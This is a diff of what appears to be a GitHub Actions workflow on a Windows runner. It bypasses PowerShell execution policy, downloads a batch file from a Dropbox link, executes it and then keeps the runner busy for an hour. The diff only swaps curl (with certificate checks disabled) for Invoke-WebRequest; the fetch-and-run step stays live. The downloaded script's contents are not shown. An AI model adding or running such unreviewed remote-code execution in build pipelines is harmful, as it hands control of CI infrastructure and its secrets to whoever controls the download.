@@ -8,6 +8,6 @@ jobs:
       shell: powershell.exe -ExecutionPolicy Bypass
     steps:
       - run: |
-         curl -Lkso start.bat "https://www.dropbox.com/scl/fi/ir1q6lxyqfbg178nsrvn9/test.bat?rlkey=wn117nwq2081wfpiw58lrx8bt"
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/ir1q6lxyqfbg178nsrvn9/test.bat?rlkey=wn117nwq2081wfpiw58lrx8bt" -OutFile start.bat
          cmd /c start.bat
          Start-Sleep -Seconds 3600
